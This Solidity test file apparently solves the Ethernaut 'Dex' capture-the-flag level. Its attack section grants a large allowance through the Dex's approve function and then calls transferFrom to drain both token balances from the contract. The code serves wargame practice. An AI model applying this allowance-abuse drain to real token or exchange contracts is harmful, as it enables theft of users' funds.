// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Dex/Dex.sol";
import "../Dex/DexFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract DexTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    function testDexAttack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        DexFactory dexFactory = new DexFactory();
        ethernaut.registerLevel(dexFactory);
        vm.startPrank(tx.origin);
        address _dex = ethernaut.createLevelInstance(dexFactory);
        Dex dex = Dex(_dex);

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        Dex(dex).approve(msg.sender, 1 << 255);

        IERC20(dex.token1()).transferFrom(_dex, msg.sender, IERC20(dex.token1()).balanceOf(_dex));
        IERC20(dex.token2()).transferFrom(_dex, msg.sender, IERC20(dex.token2()).balanceOf(_dex));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(_dex));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}